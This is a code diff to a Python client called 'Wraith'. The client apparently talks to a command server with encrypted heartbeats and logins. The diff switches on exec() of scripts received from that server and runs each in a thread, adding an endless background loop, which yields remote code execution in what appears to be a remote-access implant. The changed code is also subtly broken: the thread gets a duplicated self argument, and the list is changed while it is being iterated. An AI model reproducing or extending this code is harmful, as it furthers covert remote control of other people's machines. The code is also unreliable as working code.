@@ -60,6 +60,10 @@ class Wraith(object):
         self.crypt = crypt_obj # Create a local copy of the encryption object
         self.command_queue = [] # Create a queue of all the commands to run
 
+        # Start the command running thread
+        self.command_thread = threading.Thread(target=self.run_commands_thread, args=(self,))
+        self.command_thread.start()
+
     # Make requests to the api and return responses
     def api(self, data_dict):
         # If we are meant to log interactions, log
@@ -174,16 +178,21 @@ class Wraith(object):
 
     # Run all of the commands in the command_queue
     def run_commands(self):
-        for script in self.command_queue:
-            self.putresult("SUCCESS", script)
+        for cmd in self.command_queue:
+            self.putresult("SUCCESS", "Started execution of command {}.".format(cmd[0]))
             # Define a script_main function to prevent errors in case of incorrectly formatted modules
-            #script_main = lambda a, b, c: 0
+            script_main = lambda a, b, c: 0
             # This should define the script_main function
-            #exec(script)
+            exec(cmd[1])
             # Run the script_main function in a thread
-            #script_thread = threading.Thread(target=script_main)
-            #script_thread.start()
-        self.command_queue = []
+            script_thread = threading.Thread(target=script_main, args=(self, cmd[0]))
+            script_thread.start()
+            # Remove the command from the list
+            self.command_queue.remove(cmd)
+
+    # Indefinitely run `run_commands`
+    def run_commands_thread(self):
+        while True: self.run_commands(); print(1)
 
 # Create an instance of wraith
 wraith = Wraith(connect_url, CRYPT_KEY, aes)
@@ -209,9 +218,6 @@ while True:
         while not wraith.login(): time.sleep(3)
         # Continue to the next loop (re-send heartbeat)
         continue
-
-    if len(wraith.command_queue) > 0:
-        wraith.run_commands()
 
     # Delay sending hearbeats to prevent DDoSing our own server
     time.sleep(3)
